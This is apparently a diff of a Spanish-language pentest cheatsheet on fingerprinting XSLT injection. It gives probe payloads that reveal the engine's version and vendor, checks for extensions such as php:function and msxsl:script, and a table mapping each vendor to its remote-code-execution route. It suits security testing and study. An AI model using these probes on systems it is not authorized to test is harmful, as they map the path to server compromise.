@@ -1,96 +1,69 @@
 ---
 aliases:
-  - XSLT Version Detection
+  - XSLT Detection
   - XSLT Fingerprint
+  - XSLT Version Detection
 tags:
   - type/cheatsheet
   - vuln/xslt-injection
   - technique/discovery
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 type: CheatSheet
 linked:
-  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
+  - >-
+    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
+    Injection]]
 ---
 # XSLT - Fingerprinting
 
 ***
 
-## Cheatsheet
+## Detección Básica
 
-| **Objetivo** | **Payload XSLT** | **Info extraída** |
-|:---:|:---:|---|
-| **Probe XSLT injection** | `<xsl:value-of select="'XSLT-OK'"/>` | Si aparece `XSLT-OK` en response → inyección confirmada. |
-| **Versión XSLT soportada** | `<xsl:value-of select="system-property('xsl:version')"/>` | `1.0` / `2.0` / `3.0` → determina qué funciones están disponibles. |
-| **Vendor / Engine** | `<xsl:value-of select="system-property('xsl:vendor')"/>` | Saxon / libxslt / Xalan-Java / Microsoft / PHP — decide vector RCE. |
-| **Vendor URL** | `<xsl:value-of select="system-property('xsl:vendor-url')"/>` | Info adicional del motor. |
-| **Product name (Saxon)** | `<xsl:value-of select="system-property('xsl:product-name')"/>` | Saxon-HE / Saxon-PE / Saxon-EE — features dependen de edition. |
-| **Product version** | `<xsl:value-of select="system-property('xsl:product-version')"/>` | Version exacta → CVE lookup. |
-| **Current node** | `<xsl:value-of select="generate-id(.)"/>` | ID único del nodo → confirma parse + context. |
-| **List available functions** | `<xsl:value-of select="function-available('php:function')"/>` | `true` / `false` — probar por vendor: `php:function`, `java:*`, `saxon:*`. |
-^xslt-fingerprinting
+| **Objetivo** | **Payload** | **Resultado esperado** |
+|:---:|:---:|:---:|
+| Reflexión literal | `<xsl:value-of select="'XSLT-OK'"/>` | String `XSLT-OK` en response → input procesado como XSLT. |
+| Aritmética server-side | `<xsl:value-of select="7*7"/>` | `49` → expresiones XPath se evalúan en backend. |
+| Concatenación | `<xsl:value-of select="concat('XS','LT','-',7*7)"/>` | `XSLT-49` confirma concat + aritmética. |
+| Generate-id | `<xsl:value-of select="generate-id(.)"/>` | ID único del nodo → confirma parse + context. |
+| Versión XSLT | `<xsl:value-of select="system-property('xsl:version')"/>` | `1.0` / `2.0` / `3.0` — define vocabulario disponible. |
+| Stylesheet completo | `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="'XSLT-OK'"/></xsl:template></xsl:stylesheet>` | Si input acepta XSL completo, no fragmento. |
+| Forzar parser fail | `<xsl:value-of select="bogusfunction()"/>` | Stack trace con namespace del motor. |
+| XPath type error | `<xsl:value-of select="1 div 0"/>` | Error con código XPath estándar. |
+^xslt-fp-detection
 
 ___
 
-## Overview
+## Fingerprinting de Motores
 
-Primer paso en cualquier XSLT injection: determinar **versión y motor**. El subset de funciones disponibles varía enormemente según implementación:
+| **Objetivo** | **Payload** | **Info extraída** |
+|:---:|:---:|:---:|
+| Vendor | `<xsl:value-of select="system-property('xsl:vendor')"/>` | `Saxonica` / `libxslt` / `Apache Software Foundation` / `Microsoft`. |
+| Vendor URL | `<xsl:value-of select="system-property('xsl:vendor-url')"/>` | URL oficial — corrobora vendor. |
+| Saxon product | `<xsl:value-of select="system-property('xsl:product-name')"/>` | `SAXON` / `Saxon-HE` / `Saxon-PE` / `Saxon-EE`. |
+| Saxon version | `<xsl:value-of select="system-property('xsl:product-version')"/>` | Versión exacta → CVE lookup. |
+| PHP extension | `<xsl:value-of select="function-available('php:function')"/>` | `true` → libxslt + `registerPHPFunctions()` → RCE PHP. |
+| Saxon evaluate | `<xsl:value-of select="function-available('saxon:evaluate')"/>` | `true` → Saxon-PE/EE. |
+| Java Runtime | `<xsl:value-of select="function-available('rt:exec')"/>` | `true` → Xalan o Saxon con `java:` namespace. |
+| MSXML script | `<xsl:value-of select="function-available('msxsl:script')"/>` | `true` → MSXML con scripts habilitados. |
+| document() | `<xsl:value-of select="function-available('document')"/>` | `true` → file read + SSRF (estándar 1.0+). |
+| unparsed-text() | `<xsl:value-of select="function-available('unparsed-text')"/>` | `true` → XSLT 2.0+ → file read raw. |
+| Pattern stack `net.sf.saxon.*` | Error verbose | Saxon (Java). |
+| Pattern stack `org.apache.xalan.*` | Error verbose | Xalan-Java. |
+| Pattern stack `Microsoft.XmlDom` / `System.Xml.Xsl` | Error verbose | MSXML / .NET. |
+| Pattern stack `XSLTProcessor::transformToXml` | Warning PHP | libxslt vía PHP. |
+^xslt-fp-engines
 
-| Motor | Lenguajes/ctx | Versiones | Extension support |
-|---|---|---|---|
-| **libxslt** | PHP, Python, Ruby, C | XSLT 1.0 (+EXSLT parcial) | Limitado, sin RCE nativo. |
-| **Saxon-HE** | Java (Open Source) | XSLT 2.0 / 3.0 | `saxon:*` funciones. |
-| **Saxon-PE / EE** | Java (comercial) | XSLT 2.0 / 3.0 | Extension functions, Java reflection. |
-| **Xalan-Java** | Java | XSLT 1.0 | `xalan:*` — ejecuta Java estático. |
-| **PHP XSLProcessor** | PHP | XSLT 1.0 (libxslt) | `php:function` si habilitado. |
-| **Microsoft MSXML** | .NET / COM | 1.0 / 2.0 | `msxsl:script` — embed JScript/VBScript. |
+### Decisión por vendor
 
-### Workflow de fingerprint
-
-```
-1. Probar XSLT injection básico: <xsl:value-of select="'test'"/>
-   - Si reflexiona "test" → confirmado.
-2. Extraer system-property:
-   - xsl:version → 1.0 o 2.0/3.0 (determina vocabulario disponible)
-   - xsl:vendor → Saxon / libxslt / Xalan / Microsoft / Apache
-   - xsl:product-name + xsl:product-version → CVE search
-3. Mapear extensiones: function-available('php:function') etc.
-```
-
-### Payloads template
-
-**Inyección en `<xsl:value-of>` context** (el más común):
-```xml
-<xsl:value-of select="system-property('xsl:version')"/>
-```
-
-**Inyección como stylesheet completo** (si el input acepta XSL completo):
-```xml
-<?xml version="1.0"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-    <xsl:template match="/">
-        <xsl:value-of select="system-property('xsl:vendor')"/>
-    </xsl:template>
-</xsl:stylesheet>
-```
-
-### Detección del vector
-
-Indicadores de app usando XSLT:
-- Endpoint que acepta XML/XSL upload.
-- Transformación de feeds RSS/Atom.
-- Generación de PDFs desde XML (Apache FOP, etc).
-- Dashboards que renderizan reports XML.
-- APIs que retornan `Content-Type: application/xml` + transformación.
-- Stack Java con librerías XSLT (Spring, Apache projects).
-
-### Errores típicos que confirman XSLT
-
-- `XPathException`, `XsltException`, `XTSE0010`.
-- Menciones de `Saxon`, `Xalan`, `libxslt`.
-- "Error in XSLT stylesheet".
-- Stack traces con `net.sf.saxon.*` / `org.apache.xalan.*`.
+| Vendor | XSLT máx | RCE primario |
+|---|---|---|
+| `libxslt` | 1.0 | `php:function` (si registrado) |
+| `Saxonica` | 2.0 / 3.0 | `java:` reflection (PE/EE only) |
+| `Apache Software Foundation` | 1.0 | `java.lang.Runtime` static |
+| `Microsoft` | 1.0 / 2.0 | `msxsl:script` (legacy) |
 
 ***
